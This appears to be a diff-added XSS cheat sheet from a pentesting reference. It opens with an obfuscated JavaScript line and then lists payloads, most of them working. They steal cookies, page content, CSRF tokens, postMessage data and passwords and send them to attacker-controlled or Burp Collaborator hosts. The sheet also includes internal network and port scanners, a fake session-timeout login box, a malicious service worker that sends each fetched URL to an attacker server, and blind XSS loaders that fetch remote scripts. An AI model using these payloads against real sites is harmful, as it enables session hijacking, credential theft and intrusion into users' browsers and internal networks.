+ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ ['_']; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)={ﾟΘﾟ: '_' ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +'_') [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ '_')[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +'_')[ﾟｰﾟ] }; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +'_') [c^_^o];(ﾟДﾟ) ['c'] = ((ﾟДﾟ)+'_') [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) ['o'] = ((ﾟДﾟ)+'_') [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) ['c']+(ﾟДﾟ) ['o']+(ﾟωﾟﾉ +'_')[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +'_') [ﾟｰﾟ] + ((ﾟДﾟ) +'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) ['c']+((ﾟДﾟ)+'_') [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) ['o']+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ];(ﾟДﾟ) ['_'] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+'_') [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +'_') [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +'_') [ﾟΘﾟ]+ (ﾟωﾟﾉ +'_') [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]='\\'; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +'_')[c^_^o];(ﾟДﾟ) [ﾟoﾟ]='\"';(ﾟДﾟ) ['_'] ( (ﾟДﾟ) ['_'] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) ('_');
+XSS common payloads
+Retrieve Cookies
+<img src=x onerror=this.src="http://<YOUR_SERVER_IP>/?c="+document.cookie>
+<img src=x onerror="location.href='http://<YOUR_SERVER_IP>/?c='+ document.cookie">
+<script>new Image().src="http://<IP>/?c="+encodeURI(document.cookie);</script>
+<script>new Audio().src="http://<IP>/?c="+escape(document.cookie);</script>
+<script>location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>document.location = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>document.location.href = 'http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie</script>
+<script>document.write('<img src="http://<YOUR_SERVER_IP>?c='+document.cookie+'" />')</script>
+<script>window.location.assign('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
+<script>window['location']['assign']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
+<script>window['location']['href']('http://<YOUR_SERVER_IP>/Stealer.php?cookie='+document.cookie)</script>
+<script>document.location=["http://<YOUR_SERVER_IP>?c",document.cookie].join()</script>
+<script>var i=new Image();i.src="http://<YOUR_SERVER_IP>/?c="+document.cookie</script>
+<script>window.location="https://<SERVER_IP>/?c=".concat(document.cookie)</script>
+<script>var xhttp=new XMLHttpRequest();xhttp.open("GET", "http://<SERVER_IP>/?c="%2Bdocument.cookie, true);xhttp.send();</script>
+<script>eval(atob('ZG9jdW1lbnQud3JpdGUoIjxpbWcgc3JjPSdodHRwczovLzxTRVJWRVJfSVA+P2M9IisgZG9jdW1lbnQuY29va2llICsiJyAvPiIp'));</script>
+<script>fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body:document.cookie});</script>
+<script>navigator.sendBeacon('https://ssrftest.com/x/AAAAA',document.cookie)</script>
+You won't be able to access the cookies from JavaScript if the HTTPOnly flag is set in the cookie. But here you have 
+ if you are lucky enough.
+Steal Page Content
+var url = "http://10.10.10.25:8000/vac/a1fbf2d1-7c3f-48d2-b0c3-a205e54e09e8";
+var attacker = "http://10.10.14.8/exfil";
+var xhr  = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+    if (xhr.readyState == XMLHttpRequest.DONE) {
+        fetch(attacker + "?" + encodeURI(btoa(xhr.responseText)))
+    }
+}
+xhr.open('GET', url, true);
+xhr.send(null);
+Find internal IPs
+<script>
+var q = []
+var collaboratorURL = 'http://5ntrut4mpce548i2yppn9jk1fsli97.burpcollaborator.net';
+var wait = 2000
+var n_threads = 51
+​
+// Prepare the fetchUrl functions to access all the possible
+for(i=1;i<=255;i++){
+  q.push(
+  function(url){
+    return function(){
+        fetchUrl(url, wait);
+    }
+  }('http://192.168.0.'+i+':8080'));
+}
+​
+// Launch n_threads threads that are going to be calling fetchUrl until there is no more functions in q
+for(i=1; i<=n_threads; i++){
+  if(q.length) q.shift()();
+}
+​
+function fetchUrl(url, wait){
+    console.log(url)
+  var controller = new AbortController(), signal = controller.signal;
+  fetch(url, {signal}).then(r=>r.text().then(text=>
+    {
+        location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now()
+    }
+  ))
+  .catch(e => {
+  if(!String(e).includes("The user aborted a request") && q.length) {
+    q.shift()();
+  }
+  });
+​
+  setTimeout(x=>{
+  controller.abort();
+  if(q.length) {
+    q.shift()();
+  }
+  }, wait);
+}
+</script>
+​
+Port Scanner (fetch)
+const checkPort = (port) => { fetch(http://localhost:${port}, { mode: "no-cors" }).then(() => { let img = document.createElement("img"); img.src = http://attacker.com/ping?port=${port}; }); } for(let i=0; i<1000; i++) { checkPort(i); }
+Port Scanner (websockets)
+var ports = [80, 443, 445, 554, 3306, 3690, 1234];
+for(var i=0; i<ports.length; i++) {
+    var s = new WebSocket("wss://192.168.1.1:" + ports[i]);
+    s.start = performance.now();
+    s.port = ports[i];
+    s.onerror = function() {
+        console.log("Port " + this.port + ": " + (performance.now() -this.start) + " ms");
+    };
+    s.onopen = function() {
+        console.log("Port " + this.port+ ": " + (performance.now() -this.start) + " ms");
+    };
+}
+Short times indicate a responding port Longer times indicate no response.
+Review the list of ports banned in Chrome  and in Firefox 
+.
+Box to ask for credentials
+<style>::placeholder { color:white; }</style><script>document.write("<div style='position:absolute;top:100px;left:250px;width:400px;background-color:white;height:230px;padding:15px;border-radius:10px;color:black'><form action='https://example.com/'><p>Your sesion has timed out, please login again:</p><input style='width:100%;' type='text' placeholder='Username' /><input style='width: 100%' type='password' placeholder='Password'/><input type='submit' value='Login'></form><p><i>This login box is presented using XSS as a proof-of-concept</i></p></div>")</script>
+Auto-fill passwords capture
+<b>Username:</><br>
+<input name=username id=username>
+<b>Password:</><br>
+<input type=password name=password onchange="if(this.value.length)fetch('https://YOUR-SUBDOMAIN-HERE.burpcollaborator.net',{
+method:'POST',
+mode: 'no-cors',
+body:username.value+':'+this.value
+});">
+When any data is introduced in the password field, the username and password is sent to the attackers server, even if the client selects a saved password and don't write anything the credentials will be ex-filtrated.
+Keylogger
+Just searching in github I found a few different ones:
+​
+​
+​
+​
+​
+​
+
+    You can also use metasploit http_javascript_keylogger
+
+XSS - Stealing CSRF tokens
+<script>
+var req = new XMLHttpRequest();
+req.onload = handleResponse;
+req.open('get','/email',true);
+req.send();
+function handleResponse() {
+    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
+    var changeReq = new XMLHttpRequest();
+    changeReq.open('post', '/email/change-email', true);
+    changeReq.send('csrf='+token+'&email=test@test.com')
+};
+</script>
+XSS - Stealing PostMessage messages
+<img src="https://attacker.com/?" id=message>
+<script>
+ window.onmessage = function(e){
+ document.getElementById("message").src += "&"+e.data;
+</script>
+XSS - Abusing Service Workers
+A service worker is a script that your browser runs in the background, separate from a web page, opening the door to features that don't need a web page or user interaction. (
+).
+The goal of this attack is to create service workers on the victim session inside the vulnerable web domain that grant the attacker control over all the pages the victim will load in that domain.
+You can see them in the Service Workers field in the Application tab of Developer Tools. You can also look at 
+.
+If the victim didn't grant push notifications permissions the service worker won't be able to receive communications from the server if the user doesn't access the attacker  page again. This will prevent for example, maintain conversations with all the pages that accessed the attacker web page so web a exploit if found the SW can receive it and execute it. However, if the victim grants push notifications permissions this could be a risk.
+In order to exploit this vulnerability you need to find:
+A way to upload arbitrary JS files to the server and a XSS to load the service worker of the uploaded JS file
+
+    A vulnerable JSONP request where you can manipulate the output (with arbitrary JS code) and a XSS to load the JSONP with a payload that will load a malicious service worker.
+
+In the following example I'm going to present a code to register a new service worker that will listen to the fetch event and will send to the attackers server each fetched URL (this is the code you would need to upload to the server or load via a vulnerable JSONP response):
+self.addEventListener('fetch', function(e) {
+  e.respondWith(caches.match(e.request).then(function(response) {
+    fetch('https://attacker.com/fetch_url/' + e.request.url)
+});
+And this is the code that will register the worker (the code you should be able to execute abusing a XSS). In this case a GET request will be sent to the attackers server notifying if the registration of the service worker was successful or not:
+<script>
+window.addEventListener('load', function() {
+var sw = "/uploaded/ws_js.js";
+navigator.serviceWorker.register(sw, {scope: '/'})
+  .then(function(registration) {
+    var xhttp2 = new XMLHttpRequest();
+    xhttp2.open("GET", "https://attacker.com/SW/success", true);
+    xhttp2.send();
+  }, function (err) {
+    var xhttp2 = new XMLHttpRequest();
+    xhttp2.open("GET", "https://attacker.com/SW/error", true);
+    xhttp2.send();
+  });
+});
+</script>
+In case of abusing a vulnerable JSONP endpoint you should put the value inside var sw. For example:
+var sw = "/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//";
+There is C2 dedicated to the exploitation of Service Workers called 
+ that will be very useful to abuse these vulnerabilities.
+In an XSS situation, the 24 hour cache directive limit ensures that a malicious or compromised SW will outlive a fix to the XSS vulnerability by a maximum of 24 hours (assuming the client is online). Site operators can shrink the window of vulnerability by setting lower TTLs on SW scripts. We also encourage developers to 
+.
+Polyglots
+Blind XSS payloads
+You can also use: 
+​
+"><img src='//domain/xss'>
+"><script src="//domain/xss.js"></script>
+><a href="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">Click Me For An Awesome Time</a>
+<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//0mnb1tlfl5x4u55yfb57dmwsajgd42.burpcollaborator.net/scriptb");a.send();</script>
+​
+<!-- html5sec - Self-executing focus event via autofocus: -->
+"><input onfocus="eval('d=document; _ = d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')" autofocus>
+​
+<!-- html5sec - JavaScript execution via iframe and onload -->
+"><iframe onload="eval('d=document; _=d.createElement(\'script\');_.src=\'\/\/domain/m\';d.body.appendChild(_)')"> 
+​
+<!-- html5sec - SVG tags allow code to be executed with onload without any other elements. -->
+"><svg onload="javascript:eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')" xmlns="http://www.w3.org/2000/svg"></svg>
+​
+<!-- html5sec -  allow error handlers in <SOURCE> tags if encapsulated by a <VIDEO> tag. The same works for <AUDIO> tags  -->
+"><video><source onerror="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">
+​
+<!--  html5sec - eventhandler -  element fires an "onpageshow" event without user interaction on all modern browsers. This can be abused to bypass blacklists as the event is not very well known.  -->
+"><body onpageshow="eval('d=document; _ = d.createElement(\'script\');_.src=\'//domain\';d.body.appendChild(_)')">
+​
+<!-- xsshunter.com - Sites that use JQuery -->
+<script>$.getScript("//domain")</script>
+​
+<!-- xsshunter.com - When <script> is filtered -->
+"><img src=x id=payload&#61;&#61; onerror=eval(atob(this.id))>
+​
+<!-- xsshunter.com - Bypassing poorly designed systems with autofocus -->
+"><input onfocus=eval(atob(this.id)) id=payload&#61;&#61; autofocus>
+​
+<!-- noscript trick -->
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+​
+<!-- whitelisted CDNs in CSP -->
+"><script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.1/angular.js"></script>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
+<!-- ... add more CDNs, you'll get WARNING: Tried to load angular more than once if multiple load. but that does not matter you'll get a HTTP interaction/exfiltration :-]... -->
+<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x1') ? '' : d.location='//localhost/mH/'"></textarea></div>
+Brute-Force List
+XSS Abusing other vulnerabilities
+XSS in Markdown
+Check 
+ to find possible payloads
+XSS to SSRF
+Got XSS on a site that uses caching? Try upgrading that to SSRF through Edge Side Include Injection with this payload:
+<esi:include src="http://yoursite.com/capture" />
+Use it to bypass cookie restrictions, XSS filters and much more!
+More information about this technique here: 
+.
+XSS in dynamic created PDF
+If a web page is creating a PDF using user controlled input, you can try to trick the bot that is creating the PDF into executing arbitrary JS code.
+So, if the PDF creator bot finds some kind of HTML tags, it is going to interpret them, and you can abuse this behaviour to cause a Server XSS.
+If you cannot inject HTML tags it could be worth it to try to inject PDF data:
+XSS uploading files (svg)
+Upload as an image a file like the following one (from 
+):
+Content-Type: multipart/form-data; boundary=---------------------------232181429808
+Content-Length: 574
+-----------------------------232181429808
+Content-Disposition: form-data; name="img"; filename="img.svg"
+Content-Type: image/svg+xml
+​
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
+   <script type="text/javascript">
+      alert(1);
+   </script>
+</svg>
+-----------------------------232181429808--
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+   <script type="text/javascript">alert("XSS")</script>
+</svg>
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
+<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
+<script type="text/javascript">
+alert("XSS");
+</script>
+</svg>
+XSS resources
+​
+    
+​
+XSS TOOLS
+Find some 
+.
